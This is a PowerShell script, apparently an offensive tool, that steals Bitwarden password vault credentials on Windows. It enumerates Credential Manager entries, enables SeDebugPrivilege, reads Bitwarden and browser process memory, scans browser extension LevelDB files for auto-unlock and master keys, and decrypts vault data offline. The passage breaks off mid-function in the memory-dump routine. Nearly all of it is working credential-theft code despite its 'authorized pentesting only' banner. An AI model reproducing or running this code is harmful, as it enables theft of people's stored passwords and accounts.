<#
.SYNOPSIS
    Bitwarden Post-Exploitation Tool for authorized penetration testing.
.DESCRIPTION
    Extracts Bitwarden vault credentials via recon, memory dump, and offline decryption.
    Pure PowerShell + .NET P/Invoke. No external dependencies.
#>
[CmdletBinding(DefaultParameterSetName = 'Help')]
param(
    [Parameter(ParameterSetName = 'Recon')][switch]$Recon,
    [Parameter(ParameterSetName = 'Dump')][switch]$Dump,
    [Parameter(ParameterSetName = 'Offline')][switch]$Offline,
    [Parameter(ParameterSetName = 'Parse')][string]$ParseDump,
    [Parameter(ParameterSetName = 'All')][switch]$All,
    [int]$TargetPid = 0,
    [string]$ApiUrl = "https://vault.bitwarden.com",
    [switch]$SaveDump,
    [string]$OutputFile = "credentials.json",
    [Alias('h')][switch]$Help
)

# ============================================================================
#  P/Invoke + C# Interop
# ============================================================================

$csharpCode = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace BW {

    // --- Credential Manager ---
    [StructLayout(LayoutKind.Sequential)]
    public struct CREDENTIAL {
        public uint Flags;
        public uint Type;
        public IntPtr TargetName;
        public IntPtr Comment;
        public long LastWritten;
        public uint CredentialBlobSize;
        public IntPtr CredentialBlob;
        public uint Persist;
        public uint AttributeCount;
        public IntPtr Attributes;
        public IntPtr TargetAlias;
        public IntPtr UserName;
    }

    public class CredInfo {
        public string TargetName;
        public string UserName;
        public uint Type;
        public byte[] Blob;
        public string BlobAsUtf16;
        public string BlobAsUtf8;
    }

    public static class CredMgr {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr creds);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CredRead(string target, uint type, int flags, out IntPtr cred);

        [DllImport("advapi32.dll")]
        static extern void CredFree(IntPtr buf);

        static CredInfo ParseCred(IntPtr ptr) {
            CREDENTIAL c = (CREDENTIAL)Marshal.PtrToStructure(ptr, typeof(CREDENTIAL));
            var info = new CredInfo();
            info.TargetName = c.TargetName != IntPtr.Zero ? Marshal.PtrToStringUni(c.TargetName) : "";
            info.UserName = c.UserName != IntPtr.Zero ? Marshal.PtrToStringUni(c.UserName) : "";
            info.Type = c.Type;
            if (c.CredentialBlobSize > 0 && c.CredentialBlob != IntPtr.Zero) {
                info.Blob = new byte[c.CredentialBlobSize];
                Marshal.Copy(c.CredentialBlob, info.Blob, 0, (int)c.CredentialBlobSize);
                try { info.BlobAsUtf16 = Encoding.Unicode.GetString(info.Blob); } catch {}
                try { info.BlobAsUtf8 = Encoding.UTF8.GetString(info.Blob); } catch {}
            }
            return info;
        }

        public static List<CredInfo> Enumerate(string filter) {
            var list = new List<CredInfo>();
            IntPtr pCreds; int count;
            if (!CredEnumerate(filter, 0, out count, out pCreds)) return list;
            try {
                for (int i = 0; i < count; i++) {
                    IntPtr p = Marshal.ReadIntPtr(pCreds, i * IntPtr.Size);
                    list.Add(ParseCred(p));
                }
            } finally { CredFree(pCreds); }
            return list;
        }

        public static CredInfo Read(string target, uint type) {
            IntPtr pCred;
            if (!CredRead(target, type, 0, out pCred)) return null;
            try { return ParseCred(pCred); }
            finally { CredFree(pCred); }
        }
    }

    // --- Process Memory ---
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public long Luid;
        public uint Attributes;
    }

    public static class Mem {
        const int PROCESS_VM_READ = 0x0010;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_GUARD = 0x100;
        const uint PAGE_NOACCESS = 0x01;
        const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint TOKEN_QUERY = 0x0008;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(int access, bool inherit, int pid);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out int read);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION info, int len);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr h);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ph, uint access, out IntPtr th);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr th, bool disableAll, ref TOKEN_PRIVILEGES tp, int bufLen, IntPtr prev, IntPtr retLen);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool LookupPrivilegeValue(string host, string name, out long luid);

        public static bool EnableDebugPrivilege() {
            IntPtr token;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token)) return false;
            long luid;
            if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid)) { CloseHandle(token); return false; }
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Luid = luid;
            tp.Attributes = SE_PRIVILEGE_ENABLED;
            bool ok = AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            CloseHandle(token);
            return ok && Marshal.GetLastWin32Error() == 0;
        }

        public static IntPtr Open(int pid) {
            return OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
        }

        public static void Close(IntPtr h) { if (h != IntPtr.Zero) CloseHandle(h); }

        public static List<long[]> GetRegions(IntPtr h) {
            var regions = new List<long[]>();
            long addr = 0;
            int mbiSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));
            MEMORY_BASIC_INFORMATION mbi;
            while (VirtualQueryEx(h, (IntPtr)addr, out mbi, mbiSize) != 0) {
                long size = mbi.RegionSize.ToInt64();
                if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS && (mbi.Protect & PAGE_GUARD) == 0) {
                    if (size > 0 && size <= 100 * 1024 * 1024) {
                        regions.Add(new long[] { mbi.BaseAddress.ToInt64(), size });
                    }
                }
                long next = mbi.BaseAddress.ToInt64() + size;
                if (next <= addr) break;
                addr = next;
            }
            return regions;
        }

        public static byte[] ReadRegion(IntPtr h, long baseAddr, int size) {
            byte[] buf = new byte[size];
            int read;
            if (ReadProcessMemory(h, (IntPtr)baseAddr, buf, size, out read)) {
                if (read < size) Array.Resize(ref buf, read);
                return buf;
            }
            return null;
        }
    }
}
'@

try {
    Add-Type -TypeDefinition $csharpCode -ErrorAction Stop
} catch {
    if ($_.Exception.Message -notlike '*already exists*' -and
        $_.Exception.InnerException -and
        $_.Exception.InnerException.Message -notlike '*already exists*') {
        throw
    }
}

# ============================================================================
#  Helper Functions
# ============================================================================

function Show-Banner {
    $banner = @"

  ____  _ _ __        __            _
 | __ )(_) |\ \      / /_ _ _ __ __| | ___ _ __
 |  _ \| | __\ \ /\ / / _` | '__/ _` |/ _ \ '_ \
 | |_) | | |_ \ V  V / (_| | | | (_| |  __/ | | |
 |____/|_|\__| \_/\_/ \__,_|_|  \__,_|\___|_| |_|
                                    Vault Dumper

  Bitwarden Post-Exploitation Tool - For authorized pentesting only
"@
    Write-Host $banner -ForegroundColor Cyan
}

function Show-Help {
    $helpText = @"

  MODES:
    -Recon              Enumerate Bitwarden presence (desktop + browser extensions),
                        Credential Manager, data.json config, recommend attack path
    -Dump               Dump memory from Bitwarden desktop AND browser extension
                        processes (Chrome, Brave, Edge, Firefox, Vivaldi)
    -Offline            Full offline vault decryption via Credential Manager + data.json
    -ParseDump <file>   Parse an existing memory dump file
    -All                Run recon, then execute best available attack automatically

  OPTIONS:
    -TargetPid <int>    Target a specific PID (with -Dump, skips auto-discovery)
    -ApiUrl <url>       Bitwarden/Vaultwarden API URL (with -Offline, default: vault.bitwarden.com)
    -SaveDump           Save raw memory dump to disk (with -Dump)
    -OutputFile <file>  Output file for results (default: credentials.json)
    -Verbose            Show detailed debug output
    -Help               Show this help message

  EXAMPLES:
    .\Invoke-BitwardenDump.ps1 -Recon
    .\Invoke-BitwardenDump.ps1 -Dump
    .\Invoke-BitwardenDump.ps1 -Dump -SaveDump
    .\Invoke-BitwardenDump.ps1 -Dump -TargetPid 4812
    .\Invoke-BitwardenDump.ps1 -Offline -ApiUrl https://vaultwarden.corp.local
    .\Invoke-BitwardenDump.ps1 -ParseDump .\bitwarden.dmp
    .\Invoke-BitwardenDump.ps1 -All

  PRIVILEGES:
    Same user as Bitwarden  -> No special privs needed
    Different user           -> Requires Admin/SYSTEM (SeDebugPrivilege)

  ATTACK PATHS:
    1. Timeout=Never or old Windows Hello -> -Offline (best: silent, offline, complete)
    2. Vault unlocked (desktop or browser)-> -Dump (desktop app + browser extensions)
    3. PIN unlock enabled                 -> -Offline + PIN bruteforce
"@
    Write-Host $helpText -ForegroundColor Gray
}

function Write-Status {
    param([string]$Message, [string]$Type = "info")
    switch ($Type) {
        "good"    { Write-Host "  [+] " -NoNewline -ForegroundColor Green;  Write-Host $Message }
        "bad"     { Write-Host "  [-] " -NoNewline -ForegroundColor Red;    Write-Host $Message }
        "warn"    { Write-Host "  [*] " -NoNewline -ForegroundColor Yellow; Write-Host $Message }
        "info"    { Write-Host "  [i] " -NoNewline -ForegroundColor Cyan;   Write-Host $Message }
        "header"  { Write-Host "`n  === $Message ===" -ForegroundColor Magenta }
    }
}

function Get-ProcessOwner {
    param([int]$ProcessId)
    try {
        $wmi = Get-CimInstance Win32_Process -Filter "ProcessId = $ProcessId" -ErrorAction Stop
        $owner = Invoke-CimMethod -InputObject $wmi -MethodName GetOwner -ErrorAction Stop
        if ($owner.Domain -and $owner.User) { return "$($owner.Domain)\$($owner.User)" }
        return $owner.User
    } catch { return "UNKNOWN" }
}

# ============================================================================
#  Crypto Functions (Bitwarden AES-256-CBC + HMAC-SHA256)
# ============================================================================

function Split-EncString {
    param([string]$EncString)
    if ([string]::IsNullOrEmpty($EncString)) { return $null }
    $dotIdx = $EncString.IndexOf('.')
    if ($dotIdx -lt 0) { return $null }
    $encType = [int]$EncString.Substring(0, $dotIdx)
    $data = $EncString.Substring($dotIdx + 1)
    $parts = $data.Split('|')
    switch ($encType) {
        0 { return @{ Type = 0; Data = $parts[0] } }
        2 {
            if ($parts.Count -ge 3) {
                return @{ Type = 2; IV = $parts[0]; CT = $parts[1]; MAC = $parts[2] }
            } elseif ($parts.Count -eq 2) {
                return @{ Type = 2; IV = $parts[0]; CT = $parts[1]; MAC = $null }
            }
        }
        4 { return @{ Type = 4; CT = $parts[0] } }
        6 {
            if ($parts.Count -ge 2) {
                return @{ Type = 6; CT = $parts[0]; MAC = $parts[1] }
            }
        }
    }
    return $null
}

function Decrypt-AesCbc256 {
    param(
        [byte[]]$EncKey,
        [byte[]]$MacKey,
        [byte[]]$IV,
        [byte[]]$CT,
        [byte[]]$MAC
    )
    if ($MacKey -and $MAC) {
        $hmac = New-Object System.Security.Cryptography.HMACSHA256
        $hmac.Key = $MacKey
        $data = New-Object byte[] ($IV.Length + $CT.Length)
        [Array]::Copy($IV, 0, $data, 0, $IV.Length)
        [Array]::Copy($CT, 0, $data, $IV.Length, $CT.Length)
        $computed = $hmac.ComputeHash($data)
        $hmac.Dispose()
        $match = $true
        for ($i = 0; $i -lt [Math]::Min($computed.Length, $MAC.Length); $i++) {
            if ($computed[$i] -ne $MAC[$i]) { $match = $false; break }
        }
        if (-not $match) {
            Write-Verbose "HMAC verification failed"
            return $null
        }
    }
    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize = 256
        $aes.Key = $EncKey
        $aes.IV = $IV
        $dec = $aes.CreateDecryptor()
        $result = $dec.TransformFinalBlock($CT, 0, $CT.Length)
        $dec.Dispose()
        $aes.Dispose()
        return $result
    } catch {
        Write-Verbose "AES decryption failed: $_"
        return $null
    }
}

function Decrypt-EncString {
    param(
        [string]$EncString,
        [byte[]]$EncKey,
        [byte[]]$MacKey
    )
    $parsed = Split-EncString $EncString
    if (-not $parsed) { return $null }
    switch ($parsed.Type) {
        2 {
            $iv  = [Convert]::FromBase64String($parsed.IV)
            $ct  = [Convert]::FromBase64String($parsed.CT)
            $mac = if ($parsed.MAC) { [Convert]::FromBase64String($parsed.MAC) } else { $null }
            $plainBytes = Decrypt-AesCbc256 -EncKey $EncKey -MacKey $MacKey -IV $iv -CT $ct -MAC $mac
            if ($plainBytes) { return [System.Text.Encoding]::UTF8.GetString($plainBytes) }
        }
        0 {
            $raw = [Convert]::FromBase64String($parsed.Data)
            if ($raw.Length -lt 16) { return $null }
            $iv = $raw[0..15]
            $ct = $raw[16..($raw.Length - 1)]
            $plainBytes = Decrypt-AesCbc256 -EncKey $EncKey -MacKey $null -IV $iv -CT $ct -MAC $null
            if ($plainBytes) { return [System.Text.Encoding]::UTF8.GetString($plainBytes) }
        }
    }
    return $null
}

function Decrypt-EncStringToBytes {
    param(
        [string]$EncString,
        [byte[]]$EncKey,
        [byte[]]$MacKey
    )
    $parsed = Split-EncString $EncString
    if (-not $parsed) { return $null }
    if ($parsed.Type -eq 2) {
        $iv  = [Convert]::FromBase64String($parsed.IV)
        $ct  = [Convert]::FromBase64String($parsed.CT)
        $mac = if ($parsed.MAC) { [Convert]::FromBase64String($parsed.MAC) } else { $null }
        return Decrypt-AesCbc256 -EncKey $EncKey -MacKey $MacKey -IV $iv -CT $ct -MAC $mac
    }
    return $null
}

function Decrypt-RsaOaepSha1 {
    param([byte[]]$CT, [byte[]]$PrivateKeyDer)
    try {
        $rsa = [System.Security.Cryptography.RSA]::Create()
        $rsa.ImportPkcs8PrivateKey($PrivateKeyDer, [ref]$null)
        $plain = $rsa.Decrypt($CT, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA1)
        $rsa.Dispose()
        return $plain
    } catch {
        Write-Verbose "RSA-OAEP-SHA1 decryption failed: $_"
        return $null
    }
}

function Get-KeyParts {
    param([byte[]]$KeyBytes)
    if ($KeyBytes.Length -lt 32) { return $null }
    $encKey = New-Object byte[] 32
    [Array]::Copy($KeyBytes, 0, $encKey, 0, 32)
    $macKey = $null
    if ($KeyBytes.Length -ge 64) {
        $macKey = New-Object byte[] 32
        [Array]::Copy($KeyBytes, 32, $macKey, 0, 32)
    }
    return @{ EncKey = $encKey; MacKey = $macKey }
}

# ============================================================================
#  Recon Mode
# ============================================================================

function Invoke-BWRecon {
    Write-Status "RECONNAISSANCE" "header"

    # --- Bitwarden Processes ---
    Write-Status "BITWARDEN PROCESSES" "header"
    $bwProcesses = @()
    $procs = Get-Process -ErrorAction SilentlyContinue | Where-Object {
        $_.ProcessName -match '(?i)bitwarden|bw'
    }
    if ($procs) {
        foreach ($p in $procs) {
            $owner = Get-ProcessOwner -ProcessId $p.Id
            $memMB = [math]::Round($p.WorkingSet64 / 1MB, 1)
            $cmdLine = ""
            try {
                $wmi = Get-CimInstance Win32_Process -Filter "ProcessId = $($p.Id)" -ErrorAction Stop
                $cmdLine = $wmi.CommandLine
            } catch {}
            $info = [PSCustomObject]@{
                PID = $p.Id; Name = $p.ProcessName; Owner = $owner
                MemoryMB = $memMB; CommandLine = $cmdLine
            }
            $bwProcesses += $info
            Write-Status "PID $($p.Id) | $($p.ProcessName) | Owner: $owner | Mem: ${memMB}MB" "good"
            if ($cmdLine) { Write-Status "  CMD: $cmdLine" "info" }
        }
    } else {
        Write-Status "No Bitwarden processes found" "warn"
    }

    # --- Desktop App ---
    Write-Status "DESKTOP APP" "header"
    $desktopPaths = @(
        "$env:ProgramFiles\Bitwarden\Bitwarden.exe",
        "${env:ProgramFiles(x86)}\Bitwarden\Bitwarden.exe",
        "$env:LOCALAPPDATA\Programs\Bitwarden\Bitwarden.exe",
        "$env:LOCALAPPDATA\Bitwarden\Bitwarden.exe"
    )
    $desktopFound = $false
    foreach ($dp in $desktopPaths) {
        if (Test-Path $dp) {
            $ver = (Get-Item $dp).VersionInfo.ProductVersion
            Write-Status "Desktop app found: $dp (v$ver)" "good"
            $desktopFound = $true
            break
        }
    }
    if (-not $desktopFound) {
        Write-Status "Desktop app not found in standard paths" "warn"
    }

    # --- data.json ---
    Write-Status "DATA.JSON ANALYSIS" "header"
    $dataJsonPaths = @()
    $userProfiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') }
    foreach ($profile in $userProfiles) {
        $djPath = Join-Path $profile.FullName "AppData\Roaming\Bitwarden\data.json"
        if (Test-Path $djPath) { $dataJsonPaths += $djPath }
        $cliPath = Join-Path $profile.FullName "AppData\Roaming\Bitwarden CLI\data.json"
        if (Test-Path $cliPath) { $dataJsonPaths += $cliPath }
    }
    $script:dataJsonInfo = @()
    foreach ($djp in $dataJsonPaths) {
        Write-Status "Found: $djp" "good"
        try {
            $json = Get-Content $djp -Raw -ErrorAction Stop | ConvertFrom-Json
            $allProps = @{}
            $json.PSObject.Properties | ForEach-Object { $allProps[$_.Name] = $_.Value }

            # Find active user and all user IDs
            $activeUserId = $null
            if ($allProps.ContainsKey('global_account_activeAccountId')) {
                $activeUserId = $allProps['global_account_activeAccountId']
            }
            $allUserIds = @()
            if ($activeUserId) { $allUserIds += $activeUserId }
            $allProps.Keys | ForEach-Object {
                if ($_ -match '^user_([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})_') {
                    if ($Matches[1] -notin $allUserIds) { $allUserIds += $Matches[1] }
                }
                if ($_ -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$') {
                    if ($_ -notin $allUserIds) { $allUserIds += $_ }
                }
            }

            foreach ($userId in $allUserIds) {
                $info = @{ UserId = $userId; Path = $djp; Email = ""; Timeout = ""; HasCiphers = $false; HasPrivateKey = $false; HasPinUnlock = $false; CipherCount = 0; KDF = "" }

                # Modern flat keys
                $accountsKey = 'global_account_accounts'
                if ($allProps.ContainsKey($accountsKey) -and $allProps[$accountsKey] -is [PSObject]) {
                    $accts = $allProps[$accountsKey]
                    if ($accts.PSObject.Properties[$userId]) {
                        $acct = $accts.$userId
                        if ($acct.PSObject.Properties['email']) { $info.Email = $acct.email }
                        elseif ($acct.PSObject.Properties['name']) { $info.Email = $acct.name }
                    }
                }
                $toKey = "user_${userId}_vaultTimeoutSettings_vaultTimeout"
                if ($allProps.ContainsKey($toKey)) { $info.Timeout = "$($allProps[$toKey])" }
                $cryptoKey = "user_${userId}_crypto_accountCryptographicState"
                if ($allProps.ContainsKey($cryptoKey)) { $info.HasPrivateKey = $true }
                $ciphersKey = "user_${userId}_ciphers_ciphers"
                if ($allProps.ContainsKey($ciphersKey) -and $allProps[$ciphersKey] -is [PSObject]) {
                    $info.HasCiphers = $true
                    $info.CipherCount = ($allProps[$ciphersKey].PSObject.Properties | Measure-Object).Count
                }
                $pinKey = "user_${userId}_pinUnlock_pinKeyEncryptedUserKeyPersistent"
                if ($allProps.ContainsKey($pinKey) -and $allProps[$pinKey]) { $info.HasPinUnlock = $true }
                $kdfKey = "user_${userId}_kdfConfig_kdfConfig"
                if ($allProps.ContainsKey($kdfKey) -and $allProps[$kdfKey] -is [PSObject]) {
                    $kdf = $allProps[$kdfKey]
                    $kdfType = if ($kdf.PSObject.Properties['kdfType']) { $kdf.kdfType } else { "?" }
                    $kdfIter = if ($kdf.PSObject.Properties['iterations']) { $kdf.iterations } else { "?" }
                    $info.KDF = "type=$kdfType iter=$kdfIter"
                }

                $timeoutStr = if ($info.Timeout -eq '' -or $info.Timeout -eq $null) { "UNKNOWN" }
                              elseif ($info.Timeout -match '^-1$|^null$|^never$') { "NEVER (auto-unlock)" }
                              else { "$($info.Timeout)" }
                $emailStr = if ($info.Email) { $info.Email } else { "unknown" }
                Write-Status "  User: $emailStr ($userId)" "info"
                Write-Status "    Timeout: $timeoutStr | PrivKey: $($info.HasPrivateKey) | Ciphers: $($info.CipherCount) | PIN: $($info.HasPinUnlock) | KDF: $($info.KDF)" "info"
                $script:dataJsonInfo += $info
            }
        } catch {
            Write-Status "  Failed to parse: $_" "bad"
        }
    }
    if (-not $dataJsonPaths) { Write-Status "No data.json found" "warn" }

    # --- Browser Extensions ---
    Write-Status "BROWSER EXTENSIONS" "header"
    $extPaths = @{
        "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
    }
    $extIds = @{
        "Chrome"  = "nngceckbapebfimnlniiiahkandclblb"
        "Edge"    = "jbkfoedolllekgbhcbcoahefnbanhhlh"
        "Brave"   = "nngceckbapebfimnlniiiahkandclblb"
        "Vivaldi" = "nngceckbapebfimnlniiiahkandclblb"
    }
    $script:browserExtPaths = @()
    foreach ($browser in $extPaths.Keys) {
        $userData = $extPaths[$browser]
        if (-not (Test-Path $userData)) { continue }
        $profiles = @("Default") + @(Get-ChildItem $userData -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.Name })
        foreach ($prof in $profiles) {
            $extPath = Join-Path $userData "$prof\Local Extension Settings\$($extIds[$browser])"
            if (Test-Path $extPath) {
                Write-Status "Bitwarden extension ($browser - $prof): $extPath" "good"
                $script:browserExtPaths += @{ Browser = $browser; Profile = $prof; Path = $extPath }
                $ldbFiles = Get-ChildItem $extPath -Filter "*.ldb" -ErrorAction SilentlyContinue
                $logFiles = Get-ChildItem $extPath -Filter "*.log" -ErrorAction SilentlyContinue
                Write-Status "  LDB files: $($ldbFiles.Count) | LOG files: $($logFiles.Count)" "info"
            }
        }
    }
    $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    foreach ($fp in $firefoxProfiles) {
        $fxExt = Join-Path $fp.FullName "storage\default\moz-extension*"
        $fxDirs = Get-ChildItem $fxExt -Directory -ErrorAction SilentlyContinue
        foreach ($d in $fxDirs) {
            if (Test-Path (Join-Path $d.FullName "idb")) {
                Write-Status "Firefox extension (possible): $($d.FullName)" "warn"
            }
        }
    }

    # --- Credential Manager ---
    Write-Status "CREDENTIAL MANAGER" "header"
    $script:credEntries = @()
    foreach ($filter in @("Bitwarden*", "bitwarden*")) {
        try {
            $creds = [BW.CredMgr]::Enumerate($filter)
            foreach ($c in $creds) {
                if ($c.TargetName -notin ($script:credEntries | ForEach-Object { $_.TargetName })) {
                    $script:credEntries += $c
                }
            }
        } catch {}
    }
    if ($script:credEntries.Count -gt 0) {
        foreach ($ce in $script:credEntries) {
            $blobLen = if ($ce.Blob) { $ce.Blob.Length } else { 0 }
            $marker = ""
            if ($ce.TargetName -match 'auto') { $marker = " *** AUTO-UNLOCK KEY ***" }
            elseif ($ce.TargetName -match 'biometric') { $marker = " (biometric key)" }
            Write-Status "Target: $($ce.TargetName) | User: $($ce.UserName) | BlobSize: ${blobLen}B$marker" "good"
        }
    } else {
        Write-Status "No Bitwarden entries in Credential Manager" "warn"
    }

    # --- LevelDB Key Scan ---
    Write-Status "LEVELDB KEY SCAN (Browser Extension)" "header"
    foreach ($ext in $script:browserExtPaths) {
        Write-Status "Scanning $($ext.Browser) ($($ext.Profile))..." "info"
        $found = Scan-LevelDbForKeys -ExtPath $ext.Path
        foreach ($f in $found) {
            Write-Status "  Found: $($f.Type) | Key: $($f.Key) | Value length: $($f.ValueLen)" $(if ($f.Type -match 'user_auto') { "good" } else { "info" })
        }
        if (-not $found) { Write-Status "  No sensitive keys found in LevelDB" "warn" }
    }

    # --- Attack Path Recommendations ---
    Write-Status "ATTACK PATH RECOMMENDATIONS" "header"
    $autoKeyCred = $script:credEntries | Where-Object { $_.TargetName -match 'auto' }
    if ($autoKeyCred) {
        Write-Status "OFFLINE DECRYPT POSSIBLE - Credential Manager has auto-unlock key" "good"
        Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Offline" "info"
    }
    foreach ($ext in $script:browserExtPaths) {
        $found = Scan-LevelDbForKeys -ExtPath $ext.Path
        $autoKey = $found | Where-Object { $_.Type -match 'user_auto' }
        if ($autoKey) {
            Write-Status "OFFLINE DECRYPT POSSIBLE - Browser extension ($($ext.Browser)) has plaintext auto-unlock key in LevelDB!" "good"
            Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Offline" "info"
        }
    }
    if ($bwProcesses) {
        $main = $bwProcesses | Sort-Object MemoryMB -Descending | Select-Object -First 1
        Write-Status "MEMORY DUMP POSSIBLE - Bitwarden desktop PID $($main.PID) ($($main.Owner), $($main.MemoryMB)MB)" "warn"
        Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Dump" "info"
    }
    $browserNames = @{ "chrome" = "Chrome"; "brave" = "Brave"; "msedge" = "Edge"; "firefox" = "Firefox"; "vivaldi" = "Vivaldi" }
    foreach ($pname in $browserNames.Keys) {
        $bp = Get-Process -Name $pname -ErrorAction SilentlyContinue
        if ($bp -and $script:browserExtPaths) {
            $matching = $script:browserExtPaths | Where-Object { $_.Browser -eq $browserNames[$pname] }
            if ($matching) {
                Write-Status "BROWSER DUMP POSSIBLE - $($browserNames[$pname]) ($($bp.Count) procs, extension installed)" "warn"
                Write-Status "  Run: .\Invoke-BitwardenDump.ps1 -Dump" "info"
            }
        }
    }
    if (-not $autoKeyCred -and -not $bwProcesses -and -not $script:browserExtPaths) {
        Write-Status "No attack paths identified on this machine" "bad"
    }
}

function Scan-LevelDbForKeys {
    param([string]$ExtPath)
    $results = @()
    $patterns = @(
        @{ Pattern = '_user_auto';        Type = 'user_auto' },
        @{ Pattern = '_user_biometric';   Type = 'user_biometric' },
        @{ Pattern = 'userKey';           Type = 'userKey' },
        @{ Pattern = 'session-key';       Type = 'session_key' },
        @{ Pattern = 'masterKey';         Type = 'masterKey' }
    )
    $files = Get-ChildItem $ExtPath -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Extension -in @('.ldb', '.log', '.sst') }
    foreach ($f in $files) {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
            foreach ($pat in $patterns) {
                $idx = $text.IndexOf($pat.Pattern, [StringComparison]::OrdinalIgnoreCase)
                while ($idx -ge 0) {
                    $contextStart = [Math]::Max(0, $idx - 20)
                    $contextEnd = [Math]::Min($text.Length, $idx + $pat.Pattern.Length + 500)
                    $context = $text.Substring($contextStart, $contextEnd - $contextStart)
                    $valLen = 0
                    if ($context -match '[A-Za-z0-9+/=]{44,}') {
                        $valLen = $Matches[0].Length
                    }
                    $results += [PSCustomObject]@{
                        Type = $pat.Type; Key = $pat.Pattern
                        File = $f.Name; Offset = $idx; ValueLen = $valLen
                    }
                    $nextSearch = $idx + $pat.Pattern.Length
                    if ($nextSearch -ge $text.Length) { break }
                    $idx = $text.IndexOf($pat.Pattern, $nextSearch, [StringComparison]::OrdinalIgnoreCase)
                }
            }
        } catch { Write-Verbose "Failed to read $($f.FullName): $_" }
    }
    return $results | Sort-Object Type -Unique
}

# ============================================================================
#  Dump Mode (Memory)
# ============================================================================

function Scan-ProcessMemory {
    param([System.Diagnostics.Process]$Target, [ref]$Credentials, [bool]$DoSaveDump, [string]$Label)

    $owner = Get-ProcessOwner -ProcessId $Target.Id
    $memMB = [math]::Round($Target.WorkingSet64 / 1MB, 1)
    Write-Status "Target: PID $($Target.Id) | $($Target.ProcessName) | Owner: $owner | Mem: ${memMB}MB | $Label" "info"

    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    if ($owner -ne "UNKNOWN" -and $owner -ne $currentUser) {
        Write-Status "Cross-user dump: enabling SeDebugPrivilege..." "warn"
        if ([BW.Mem]::EnableDebugPrivilege()) {
            Write-Status "SeDebugPrivilege enabled" "good"
        } else {
            Write-Status "Failed to enable SeDebugPrivilege - need Admin/SYSTEM" "bad"
            return
        }
    }

    $hProc = [BW.Mem]::Open($Target.Id)
    if ($hProc -eq [IntPtr]::Zero) {
        Write-Status "Failed to open PID $($Target.Id) (error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))" "warn"
        return
    }

    $regions = [BW.Mem]::GetRegions($hProc)
    Write-Status "  Regions: $($regions.Count) | Readable: $([math]::Round(($regions | ForEach-Object { $_[1] } | Measure-Object -Sum).Sum / 1MB, 1))MB" "info"

    $dumpStream = $null
    if ($DoSaveDump) {
        $dumpPath = "$($Target.ProcessName)_$($Target.Id).dmp"
        $dumpStream = [System.IO.File]::Create($dumpPath)
    }

    $before = $Credentials.Value.Count
    foreach ($region in $regions) {
        $baseAddr = $region[0]
        $size = [int][Math]::Min($region[1], 10 * 1024 * 1024)
        $data = [BW.Mem]::ReadRegion($hProc, $baseAddr, $size)
        if (-not $data -or $data.Length -eq 0) { continue }
        if ($dumpStream) { $dumpStream.Write($data, 0, $data.Length) }
        $str = [System.Text.Encoding]::UTF8.GetString($data)
        Find-CredentialPatterns -Text $str -Credentials $Credentials
